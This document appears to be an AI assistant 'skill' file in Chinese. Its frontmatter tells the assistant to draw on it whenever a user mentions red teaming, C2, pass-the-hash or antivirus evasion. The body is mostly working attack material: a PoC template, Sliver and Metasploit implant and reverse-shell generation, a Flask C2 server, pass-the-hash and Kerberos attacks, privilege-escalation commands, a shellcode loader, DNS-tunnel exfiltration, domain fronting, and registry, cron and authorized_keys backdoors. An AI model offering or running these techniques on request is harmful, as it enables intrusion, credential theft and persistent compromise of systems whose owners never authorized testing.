---
name: red-team
description: 红队攻击技术。PoC开发、C2框架、横向移动、权限提升、免杀技术。当用户提到红队、PoC、C2、横向移动、PTH、免杀、Cobalt Strike、Sliver、提权时使用。
---

# 🔥 赤焰秘典 · 红队攻击 (Red Team)


## 攻击链 (Kill Chain)

```
侦察 → 武器化 → 投递 → 利用 → 安装 → C2 → 行动
  │        │       │      │       │      │      │
  └─ OSINT ─┴─ PoC ─┴─ 钓鱼 ─┴─ 提权 ─┴─ 持久 ─┴─ 横向
```

## PoC 开发

### 标准 PoC 结构
```python
#!/usr/bin/env python3
"""
漏洞名称: CVE-XXXX-XXXX
影响版本: x.x.x - x.x.x
漏洞类型: RCE/SQLi/XSS/SSRF
仅用于授权测试
"""
import requests
import argparse

class POC:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }

    def check(self) -> bool:
        """无害检测"""
        try:
            # 使用延时、DNS外带等无害方式验证
            pass
        except Exception as e:
            return False

    def exploit(self, cmd: str) -> str:
        """漏洞利用"""
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cmd', default='id')
    args = parser.parse_args()

    poc = POC(args.url)
    if poc.check():
        print(f"[+] Vulnerable!")
        print(poc.exploit(args.cmd))
    else:
        print("[-] Not vulnerable")

if __name__ == '__main__':
    main()
```

## C2 框架

### Sliver (推荐开源)
```bash
# 安装
curl https://sliver.sh/install | sudo bash

# 生成 Implant
sliver > generate --mtls 192.168.1.100 --os windows --save implant.exe
sliver > generate --http 192.168.1.100 --os linux --save implant

# 启动监听
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > http --lhost 0.0.0.0 --lport 80

# 会话操作
sliver > sessions
sliver > use SESSION_ID
sliver (SESSION) > shell
sliver (SESSION) > download /etc/passwd
sliver (SESSION) > upload local remote
```

### Metasploit
```bash
# 生成 Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# 监听
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 0.0.0.0
msf6 > run

# Meterpreter
meterpreter > getsystem
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
```

### 简易 HTTP C2
```python
# Server
from flask import Flask, request, jsonify
import base64

app = Flask(__name__)
agents, tasks = {}, {}

@app.route('/beacon/<agent_id>')
def beacon(agent_id):
    if tasks.get(agent_id):
        return jsonify({"task": tasks[agent_id].pop(0)})
    return jsonify({"task": None})

@app.route('/result/<agent_id>', methods=['POST'])
def result(agent_id):
    output = base64.b64decode(request.json['output']).decode()
    print(f"[{agent_id}] {output}")
    return jsonify({"status": "ok"})
```

## 横向移动

### Pass-the-Hash (PTH)
```bash
# Impacket
psexec.py -hashes :NTLM_HASH administrator@TARGET
wmiexec.py -hashes :NTLM_HASH administrator@TARGET
smbexec.py -hashes :NTLM_HASH administrator@TARGET

# CrackMapExec
crackmapexec smb TARGET -u admin -H HASH -x "whoami"
crackmapexec smb 192.168.1.0/24 -u admin -H HASH --shares

# Mimikatz
sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Pass-the-Ticket (PTT)
```bash
# 导出票据
mimikatz # sekurlsa::tickets /export

# 注入票据
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Kerberos 攻击
```bash
# Kerberoasting
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request

# AS-REP Roasting
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP

# Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

### 远程执行方法
```bash
# WinRM
evil-winrm -i TARGET -u user -H HASH

# PowerShell Remoting
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user
Invoke-Command -ComputerName TARGET -ScriptBlock {whoami}

# WMI
wmic /node:TARGET /user:admin /password:pass process call create "cmd.exe /c whoami"
```

## 权限提升

### Windows 提权
```powershell
# 信息收集
whoami /priv
systeminfo
net user
net localgroup administrators

# 常见提权路径
- SeImpersonatePrivilege → Potato系列
- 服务配置错误 → 服务路径劫持
- 计划任务 → 任务劫持
- AlwaysInstallElevated → MSI提权
- 未打补丁 → 内核漏洞

# Potato 提权
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

### Linux 提权
```bash
# 信息收集
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null

# 常见提权路径
- SUID 二进制 → GTFOBins
- sudo 配置错误 → sudo提权
- 内核漏洞 → DirtyPipe/DirtyCow
- 定时任务 → cron劫持
- 容器逃逸 → Docker/K8s

# SUID 利用
find / -perm -4000 2>/dev/null
# 查 GTFOBins: https://gtfobins.github.io/
```

## 免杀技术

### 基础免杀
```python
# 1. 字符串混淆
import base64
payload = base64.b64encode(b"malicious_code").decode()
exec(base64.b64decode(payload))

# 2. 动态加载
import importlib
module = importlib.import_module("os")
getattr(module, "system")("whoami")

# 3. 加密 Payload
from Crypto.Cipher import AES
# 运行时解密执行
```

### Shellcode 加载
```python
import ctypes

shellcode = b"\xfc\x48\x83..."  # msfvenom 生成

# Windows
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
```

### 隐蔽通信
```python
# DNS 隧道
def dns_exfil(data, domain):
    encoded = base64.b32encode(data.encode()).decode()
    for chunk in [encoded[i:i+63] for i in range(0, len(encoded), 63)]:
        dns.resolver.resolve(f"{chunk}.{domain}", 'A')

# 域前置
def domain_fronting(real_host, cdn_domain, data):
    headers = {"Host": real_host}
    requests.post(f"https://{cdn_domain}/api", json=data, headers=headers)
```

## 持久化

### Windows
```powershell
# 注册表
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe"

# 计划任务
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon

# 服务
sc create backdoor binPath= "C:\backdoor.exe" start= auto

# WMI 事件订阅
# 进程启动时触发
```

### Linux
```bash
# Crontab
echo "* * * * * /tmp/backdoor" >> /var/spool/cron/root

# SSH 密钥
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 服务
# 创建 systemd service

# LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

## 工具清单

| 工具 | 用途 |
|------|------|
| Sliver | 开源 C2 框架 |
| Metasploit | 渗透测试框架 |
| Cobalt Strike | 商业 C2 |
| Impacket | Windows 协议工具 |
| CrackMapExec | 批量横向 |
| Mimikatz | 凭证提取 |
| Rubeus | Kerberos 工具 |
| BloodHound | AD 路径分析 |

---

